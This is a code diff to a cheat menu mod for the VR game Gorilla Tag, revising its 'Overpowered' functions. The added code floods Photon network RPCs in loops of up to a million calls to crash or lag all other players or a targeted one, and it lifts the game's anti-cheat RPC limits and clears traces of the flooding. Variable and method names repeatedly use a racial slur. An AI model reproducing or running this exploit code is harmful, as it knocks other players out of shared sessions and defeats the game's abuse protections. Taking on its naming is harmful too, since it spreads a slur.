@@ -23,78 +23,88 @@ using Photon.Realtime;
 using HarmonyLib;
 using BepInEx;
 using MenkerMenu.Utilities;
+using GorillaTagScripts;
+using System.Threading;
 
 namespace MenkerMenu.Mods.Categories
 {
     public class Overpowered
     {
-
-        public static void CrashAll()
+        public static float crashall = 0;
+        public static void InstaCrashAll()
         {
-            foreach (VRRig rig in GorillaParent.instance.vrrigs)
-            {
-                if (rig && rig != GorillaTagger.Instance.offlineVRRig)
+            for (int i = 0; i < 1000000; i++)
+                if (Time.time > crashall)
                 {
-                    PhotonView photonView = RigManager.GetPhotonViewFromVRRig(rig);
-                    ExitGames.Client.Photon.Hashtable rpcHash = new ExitGames.Client.Photon.Hashtable
-       {
-           { 0, photonView.ViewID },
-           { 2, (int)(PhotonNetwork.ServerTimestamp + -int.MaxValue) },
-           { 3, "RPC_RequestMaterialColor" },
-           { 4, new object[] { RigManager.NetPlayerToPlayer(RigManager.GetPlayerFromVRRig(rig)) } },
-           { 5, (byte)91 }
-      };
-                    PhotonNetwork.NetworkingClient.LoadBalancingPeer.OpRaiseEvent(207, rpcHash, new RaiseEventOptions
-                    {
-                        Receivers = ReceiverGroup.Others,
-                        InterestGroup = photonView.Group
-                    }, new SendOptions
-                    {
-                        Reliability = true,
-                        DeliveryMode = DeliveryMode.ReliableUnsequenced,
-                        Encrypt = false
-                    });
+                    crashall = Time.time + 0.1f;
+                    BuilderTableNetworking.instance.PlayerEnterBuilder();
                 }
-                PhotonNetwork.SendAllOutgoingCommands();
-                NoRpcniggers();
+        }
+        public static float lagalltimer = 0;
+        public static void LagAll()
+        {
+            PhotonView nigger = GameObject.Find("Environment Objects/LocalObjects_Prefab/City_WorkingPrefab/Arcade_prefab/MainRoom/VRArea/ModIOArcadeTeleporter/NetObject_VRTeleporter").GetComponent<Photon.Pun.PhotonView>();
+            if (Time.time > lagalltimer)
+            {
+                lagalltimer = Time.time + 0.1f;
+                for (int i = 0; i < 250; i++)
+                    nigger.RPC("ActivateTeleportVFX", RpcTarget.Others, new object[] { (short)UnityEngine.Random.Range(0, 7) });
             }
         }
-        public static void CrashGun()
+        public static float lagtimer = 0;
+        public static void LagGun()
         {
             GunTemplate.StartBothGuns(() =>
             {
-                if (LockedPlayer && LockedPlayer != GorillaTagger.Instance.offlineVRRig)
+                VRRig rig = GunTemplate.raycastHit.collider.GetComponentInParent<VRRig>();
+                if (rig && rig != GorillaTagger.Instance.offlineVRRig)
                 {
-                    PhotonView photonView = RigManager.GetPhotonViewFromVRRig(LockedPlayer);
-                    ExitGames.Client.Photon.Hashtable rpcHash = new ExitGames.Client.Photon.Hashtable
-       {
-           { 0, photonView.ViewID },
-           { 2, (int)(PhotonNetwork.ServerTimestamp + -int.MaxValue) },
-           { 3, "RPC_RequestMaterialColor" },
-           { 4, new object[] { RigManager.NetPlayerToPlayer(RigManager.GetPlayerFromVRRig(LockedPlayer)) } },
-           { 5, (byte)91 }
-      };
-                    PhotonNetwork.NetworkingClient.LoadBalancingPeer.OpRaiseEvent(207, rpcHash, new RaiseEventOptions
+                    if (Time.time > lagtimer)
                     {
-                        Receivers = ReceiverGroup.Others,
-                        InterestGroup = photonView.Group
-                    }, new SendOptions
-                    {
-                        Reliability = true,
-                        DeliveryMode = DeliveryMode.ReliableUnsequenced,
-                        Encrypt = false
-                    });
+                        lagtimer = Time.time + 0.1f;
+                        PhotonView nigger = GameObject.Find("Environment Objects/LocalObjects_Prefab/City_WorkingPrefab/Arcade_prefab/MainRoom/VRArea/ModIOArcadeTeleporter/NetObject_VRTeleporter").GetComponent<Photon.Pun.PhotonView>();
+                        for (int i = 0; i < 250; i++)
+                            nigger.RPC("ActivateTeleportVFX", NetPlayerToPlayer(GetPlayerFromVRRig(rig)), new object[] { (short)UnityEngine.Random.Range(0, 7) });
+                    }
                 }
-                PhotonNetwork.SendAllOutgoingCommands();
-                NoRpcniggers();
             }, true);
         }
+        public static float guntimer = 0;
+        public static void InstantsCrashGun()
+        {
+            GunTemplate.StartBothGuns(() =>
+            {
+                VRRig rig = GunTemplate.raycastHit.collider.GetComponentInParent<VRRig>();
+                if (rig && rig != GorillaTagger.Instance.offlineVRRig)
+                {
+                    for (int i = 0; i < 1000000; i++)
+                        BuilderTableNetworking.instance.PlayerEnterBuilderRPC(rig.OwningNetPlayer.GetPlayerRef(), default(PhotonMessageInfo));
+                }
+            }, true);
+        }
+        public static void CrashAll()
+        {
+            for (int i = 0; i < 100; i++)
+                BuilderTableNetworking.instance.PlayerEnterBuilder();
+        }
+
         public static void NoRpcniggers()
         {
             GorillaNot.instance.rpcCallLimit = int.MaxValue;
             GorillaNot.instance.rpcErrorMax = int.MaxValue;
             PhotonNetwork.RemoveRPCs(PhotonNetwork.LocalPlayer);
             PhotonNetwork.LocalCleanPhotonView(GorillaTagger.Instance.myVRRig.GetComponent<PhotonView>());
+            PhotonNetwork.RemoveBufferedRPCs(GorillaTagger.Instance.myVRRig.ViewID, null, null);
+        }
+        public static void FlushRPCS()
+        {
+            PhotonNetwork.RemoveRPCs(PhotonNetwork.LocalPlayer);
+            if (GorillaTagger.Instance.myVRRig != null)
+            {
+                PhotonNetwork.RemoveRPCs(PhotonNetwork.LocalPlayer);
+                PhotonNetwork.RemoveBufferedRPCs(GorillaTagger.Instance.myVRRig.ViewID, null, null);
+            }
+            GorillaNot.instance.rpcCallLimit = int.MaxValue;
         }
     }
 }
